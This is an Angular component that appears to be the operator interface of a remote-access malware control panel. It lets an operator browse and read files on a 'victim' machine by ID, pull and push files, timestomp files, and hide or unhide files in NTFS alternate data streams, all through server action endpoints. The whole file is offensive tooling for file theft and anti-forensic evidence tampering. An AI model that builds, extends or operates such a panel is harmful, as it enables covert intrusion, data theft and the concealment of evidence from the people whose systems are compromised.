import { Component } from '@angular/core';
import { HttpClient, HttpClientModule, HttpHeaders } from '@angular/common/http';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { ActivatedRoute } from '@angular/router';
import { ServerService } from '../server.service';

@Component({
  selector: 'app-file-explorer',
  standalone: true,
  imports: [HttpClientModule, CommonModule, FormsModule],
  templateUrl: './file-explorer.component.html',
  styleUrl: './file-explorer.component.css'
})

export class FileExplorerComponent {
  SEVER_URL = this.serverService.getUrl();
  endpoint = this.SEVER_URL + '/Action/Frontend';
  readFileActionEndpoint = this.SEVER_URL + '/Action/ReadFile';
  readFileEndpoint = this.SEVER_URL + '/File/ReadFile';
  folderEndpoint = this.SEVER_URL + '/Action/Folder';
  agentsEndpoint = this.SEVER_URL + '/Agent/Agents';
  downloadFileEndpoint = this.SEVER_URL + '/Action/DownloadFile';
  uploadFileEndpoint = this.SEVER_URL + '/Action/UploadFile';
  timeStompingEndpoint = this.SEVER_URL + '/Action/TimeStomping';
  hideFileEndpoint = this.SEVER_URL + '/Action/HideFile';
  unhideFileEndpoint = this.SEVER_URL + '/Action/UnhideFile';
  fileSystemString: string = '';
  fileSystem: any = {};
  indexPath: string = '';
  files: string[] = [];
  directories: string[] = [];
  fileContent: string = '';
  loading: boolean = false;
  fileName: string = '';
  agents: any = [];
  idVictim: string = '';
  downloadFilePopup: boolean = false;
  downloadFilePath: string = '';
  downloadFileUrl: string = '';
  uploadFilePopup: boolean = false;
  uploadFilePath: string = '';
  timeStompingPopup: boolean = false;
  timestompingOriginalFile: string = '';
  timestompingDestinationFile: string = '';
  hideFilePopup: boolean = false;
  unhideFilePopup: boolean = false;
  fileToHide: string = '';
  fileToUnhide: string = '';
  dstFileToHide: string = '';
  dstFileToUnhide: string = '';
  adsName: string = '';
  message: string = '';
  isError: boolean = false;

  constructor(private http: HttpClient, private route: ActivatedRoute, private serverService: ServerService) {

    this.route.params.subscribe(params => {
      this.idVictim = params['id'].toString();
    });
    console.log("sadada");
    this.getFilesAndDirectories();
  }

  getFileSystem() {
    this.indexPath = this.fileSystemString.split(';')[0];

    const fileMatches = this.fileSystemString.match(/!([^;]+?)(?=;|$)/g);
    if (fileMatches) {
      this.files = fileMatches.map(match => match.substring(1));
    }

    const directoryMatches = this.fileSystemString.split(';').filter(part => part !== '' && !part.startsWith('!'));
    this.directories = directoryMatches;

    this.directories.shift();

      this.directories = this.directories.map(directory => {
      if (directory.includes('!')) {
        return directory.split('!')[0];
      } else {
        return directory;
      }
    });

    //conditional to see if only files are present
    if (this.directories.length == 0 && this.files.length > 0) {
      let filesHere = this.files[0].split('!');
      this.files = filesHere;
    } 
  }

  

  httpOptions = {
    headers: new HttpHeaders({
      'Content-Type': 'application/json',
      'Access-Control-Allow-Origin': '*'
    }),
    responseType: 'text' as 'json' 
  };

  getFilesAndDirectories() {
    this.loading = true;
    this.http.post(this.endpoint, { victimID: this.idVictim }, this.httpOptions).subscribe((data: any) => {
      console.log("this is data spaw" + data);
      // search for desktop.ini between the data and remove it plus the following !
      data = data.replace(/desktop\.ini!;/g, ''); 
      data = data.replace(/desktop\.ini!/g, ''); 
      console.log("afterw" + data);
      this.fileSystemString = data;
      this.getFileSystem();
      this.loading = false;
    });
  }

  readFile(path: string) {
    this.loading = true;
    this.fileName = path.split('/').pop() || '';
    console.log("Reading " + path + "file");
    this.http.post(this.readFileActionEndpoint, { id: this.idVictim, path: path }, this.httpOptions).subscribe((data: any) => {
    // wait 5 seconds
    setTimeout(() => {
        //console.log(data);
        this.http.post(this.readFileEndpoint, { id: this.idVictim }, this.httpOptions).subscribe((data: any) => {
          //  replace all the -;-n with \n
          data = data.replace(/-;-n/g, '\n');
          // replace all the -;-r  with \r
          data = data.replace(/-;-r/g, '\r'); 
          // replace all the -;-t with \t
          data = data.replace(/-;-t/g, '\t');
          this.fileContent = data;
          this.loading = false;
        });
    }, 5000);
    });
  }

  clickFile(element: string){
    // if the final its not / then add it
    if (this.indexPath[this.indexPath.length - 1] !== '/') {
      this.indexPath += '/';
    }
    let path = this.indexPath + element;
    this.readFile(path);
    console.log(path);
  }

  clickFolder(element: string){
    this.loading = true;
    // modify all the \ to /
    this.indexPath = this.indexPath.replace(/\\/g, '/');
    let path = this.indexPath + "/" + element;
    console.log(path);
    this.http.post(this.folderEndpoint, { id: this.idVictim, path: path }, this.httpOptions).subscribe((data: any) => {
      console.log(data);
      this.indexPath = path;
      this.fileSystemString = data;
      this.getFileSystem();
      setTimeout(() => {
        window.location.reload();
      }, 3000);
    });
  }

  closePopup(){
    this.fileContent = '';
  }

  search(){
    console.log(this.indexPath);
    // if the final its not / then add it
    if (this.indexPath[this.indexPath.length - 1] !== '/') {
      this.indexPath += '/';
    }
    // modify all the \ to /
    this.indexPath = this.indexPath.replace(/\\/g, '/');
    
    this.loading = true;
    this.http.post(this.folderEndpoint, { id: this.idVictim, path: this.indexPath }, this.httpOptions).subscribe((data: any) => {
      console.log(data);
      this.fileSystemString = data;
      this.getFileSystem();
      setTimeout(() => {
        window.location.reload();
      }, 3000);
    });
  }

  calculateInputSize() {
    return this.indexPath ? this.indexPath.length : 10; 
  }

  uploadFile() {
    console.log("Uploading file");
    this.uploadFilePopup = true;
  }

  downloadFile() {
    console.log("Downloading file");
    this.downloadFilePopup = true;
  }

  downloadFileFinal() {
    let url = this.downloadFileUrl;
    // if the final its not / then add it
    if (url[url.length - 1] !== '/') {
      url += '/';
    }
    url += "File"
    this.http.post(this.downloadFileEndpoint, { id: this.idVictim, filePath: this.downloadFilePath, url: url }, this.httpOptions).subscribe((data: any) => {
      console.log(data);
    });

  }

  fileChange(event: any) {
    console.log(event);
  }

  closeDownloadFilePopup() {
    this.downloadFilePopup = false;
  }

  closeUploadFilePopup() {
    this.uploadFilePopup = false;
  }

  uploadFileFinal() {
    console.log(this.uploadFilePath);
    console.log("Uploading file");
    this.http.post(this.uploadFileEndpoint, { id: this.idVictim, filePath: this.uploadFilePath }, this.httpOptions).subscribe((data: any) => {
      console.log(data);
      this.uploadFilePopup = false;
      this.flashMessage(5000, "File uploaded successfully", false);
    });
  }

  timestomping(){
    this.timeStompingPopup = true;
  }

  closeTimestompingPopup(){
    this.timeStompingPopup = false;
  }

  flashMessage(time: number, message: string, isError: boolean) {
    this.message = message;
    this.isError = isError;
    setTimeout(() => {
      this.message = "";
    }, time);
  }

  timestompingFinal(){
    this.http.post(this.timeStompingEndpoint, { id: this.idVictim, originalPath: this.timestompingOriginalFile, destPath: this.timestompingDestinationFile }, this.httpOptions).subscribe((data: any) => {
      console.log(data);
    });
  }

  hideFile(){
    this.hideFilePopup = true;
  }

  unhideFile(){
    this.unhideFilePopup = true;
  }

  closeUnhideFilePopup(){
    this.unhideFilePopup = false;
  }

  closeHideFilePopup(){
    this.hideFilePopup = false;
  }

  hideFileFinal(){
    console.log(this.fileToHide);
    this.http.post(this.hideFileEndpoint, { id: this.idVictim, filePath: this.fileToHide, destPath: this.dstFileToHide, adsName: this.adsName }, this.httpOptions).subscribe((data: any) => {
      console.log(data);
    });
  }

  unhideFileFinal(){
    console.log(this.fileToUnhide);
    this.http.post(this.unhideFileEndpoint, { id: this.idVictim, filePath: this.fileToUnhide, destPath: this.dstFileToUnhide, adsName: this.adsName}, this.httpOptions).subscribe((data: any) => {
      console.log(data);
    });
  }


} 
